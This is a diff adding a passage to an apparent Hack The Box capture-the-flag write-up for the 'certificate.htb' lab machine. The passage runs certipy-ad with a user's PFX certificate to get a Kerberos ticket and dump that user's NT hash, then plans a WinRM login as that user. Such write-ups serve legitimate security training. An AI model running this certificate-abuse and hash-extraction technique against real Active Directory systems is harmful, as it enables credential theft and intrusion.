@@ -690,6 +690,28 @@ I originally tried the administrator but this failed
 
 Looking through the other users `ryan.k` looked the most interesting
 
+```python
+❯❯❯ faketime -f +8h certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.129.245.51'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Ryan.K@certificate.htb'
+[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Using principal: 'ryan.k@certificate.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ryan.k.ccache'
+[*] Wrote credential cache to 'ryan.k.ccache'
+[*] Trying to retrieve NT hash for 'ryan.k'
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+```
+
+Then i can request auth as this user
+
+And now looking at `ryan.k` he is also in remote management so ill winrm in
+
+# WINRM as `ryan.k`
+
 
 
 
